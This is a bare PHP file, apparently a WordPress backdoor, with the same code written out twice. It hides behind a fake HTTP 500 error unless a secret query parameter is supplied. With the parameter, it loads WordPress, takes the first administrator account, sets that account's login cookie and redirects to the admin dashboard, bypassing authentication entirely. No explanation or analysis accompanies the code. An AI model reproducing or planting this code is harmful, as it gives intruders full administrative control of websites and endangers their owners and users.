<?php
if (!isset($_GET['kicau99'])) {
    http_response_code(500);
    header("HTTP/1.1 500 Internal Server Error");
    exit();
}

$mr = $_SERVER['DOCUMENT_ROOT'];
@chdir($mr);

if (file_exists('wp-load.php')) {
    include 'wp-load.php';
    $wp_user_query = new WP_User_Query([
        'role'   => 'Administrator',
        'number' => 1,
        'fields' => 'ID'
    ]);

    $results = $wp_user_query->get_results();

    if (isset($results[0])) {
        wp_set_auth_cookie($results[0]);
        wp_redirect(admin_url());
        exit();
    }

    exit('NO ADMIN');
} else {
    exit('Failed to load');
}
?><?php
if (!isset($_GET['kicau99'])) {
    http_response_code(500);
    header("HTTP/1.1 500 Internal Server Error");
    exit();
}

$mr = $_SERVER['DOCUMENT_ROOT'];
@chdir($mr);

if (file_exists('wp-load.php')) {
    include 'wp-load.php';
    $wp_user_query = new WP_User_Query([
        'role'   => 'Administrator',
        'number' => 1,
        'fields' => 'ID'
    ]);

    $results = $wp_user_query->get_results();

    if (isset($results[0])) {
        wp_set_auth_cookie($results[0]);
        wp_redirect(admin_url());
        exit();
    }

    exit('NO ADMIN');
} else {
    exit('Failed to load');
}
?>
